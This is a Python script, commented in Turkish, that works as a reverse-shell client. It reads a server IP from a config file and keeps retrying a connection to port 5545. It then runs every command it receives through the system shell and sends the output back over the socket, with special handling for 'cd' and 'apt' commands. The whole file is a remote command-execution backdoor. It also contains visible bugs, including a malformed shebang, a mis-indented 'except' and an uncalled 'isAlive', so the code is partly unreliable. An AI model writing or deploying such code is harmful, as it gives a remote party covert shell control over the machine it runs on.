#/usr/bin/env python3
from subprocess import *
import socket
from threading import Thread #Gerekli modüller içeri aktraıldı
from time import sleep
import configparser
import os

def IPal(parser):##config dosyamızdan gerekli olan ip alınması için bir fonksiyon
    parser.read("istemci.inf")
    return parser['IP']['ip']

parser = configparser.ConfigParser()
ip = IPal(parser)

baglandi = False

s = socket.socket()


while (baglandi == False):
    try:
        s.connect((ip,5545))##Bağlanana kadar bekliyoruz bağlanınca döngüden çıkıp veri alış verişine hazırlanıyoruz
        baglandi = True
    except Exception as e:
        print(e)
        sleep(3)
        

del baglandi

global sonuc ##sonuc adlı bir liste ve bu listeye gelen veriyi işledikten sonraki çıktıyı buraya koyacağız
sonuc = [] 

print("baglandi")

def cevir(veri0):###Bu fonksiyon normalden farklı olarak program yavaşlamasın diye ayrı bir thread başlatarak gelen veriyi işliyoruz ve stdout ve stderr'i bir listeye atıyoruz
    surec = Popen(veri0, shell =True, stdout = PIPE ,stderr = PIPE)
    veri1 , veri2 =surec.communicate()
    sonuc.append(veri1)
    sonuc.append(veri2)

while True:  ##Sürekli veri alış-verişi için 
    gelen = s.recv(128).decode('utf-8')
    print(gelen[2:])
    if "apt" in gelen:## eğer bir servis başlıyorsa çıktı dönememe ihtimali var bu yüzden biz veri olarak kendi cümlemizi gönderiyoruz
        try:
            veri = Thread(target = cevir, args=(gelen,)) 
            veri.start() 
            while veri.isAlive:
                continue
            s.send("Başarıyla tamamlandı...".encode('utf-8')) 
         except:
            msg = "Başarılamadı..."
            s.send(msg.encode('utf-8'))
        continue
    if gelen == "cd":##eğer komutumuz cd ise bunu özel alıyoruz çünkü cd.. şeklinde bir yazım da olabileceği için hatadan kaçınıyoruz
        veri = Thread(target = cevir, args=(gelen,)) ##Karışıklık ve donmayı önlemek için yeni bir thread başlatıyoruz
        veri.start() 
 
        s.send(sonuc[0])##Gelen sonucu sunucuya gönderiyoruz
        s.send(sonuc[1])
        sonuc = []##Listemizi tekrardan boşaltıyoruz ve her seferinde verinin indisini bulmak zorunda kalmıyoruz direk 0 ve 1. indisine bakıyoruz
        continue
        
    elif gelen[:2] == "cd" and gelen[2:] != '':##eğer komut cd ise ve ondan sonra başka bir şeyler varsa bu çıktı vermeyeceği için os modülünü kullanarak gerekli işlemleri yapıyoruz
        try:
            os.chdir(gelen[2:])##Dizinimizi değiştiriyoruz
            s.send("Başarıyla tamamlandı...".encode('utf-8'))
            sonuc = []
            continue
        except Exception as e:
            s.send(e.encode('utf-8'))
            sonuc = []
            
    else:###Gerekli kontrolleri ve aynı aşamaları bir daha yapıyoruz
        veri = Thread(target = cevir, args=(gelen,)) 
        veri.start() 
        veri.join()
        veri_f = sonuc[0]
        veri_f2 = sonuc[1]
        print(veri_f,veri_f2)
        print((veri_f == b'') and (veri_f2 == b''))
        if ((veri_f == b'') and (veri_f2 == b'')):##Eğer komutta çıktı yok ise sunucu mesaj beklediği için istemci mesaj gönderiyor
            s.send("Başarıyla tamamlandı...".encode('utf-8'))
            sonuc = []    ##Ve tekrardan listemizi sıfırlıyoruz 
            continue
        s.send(veri_f)
        s.send(veri_f2)
        sonuc = [] 

s.close()

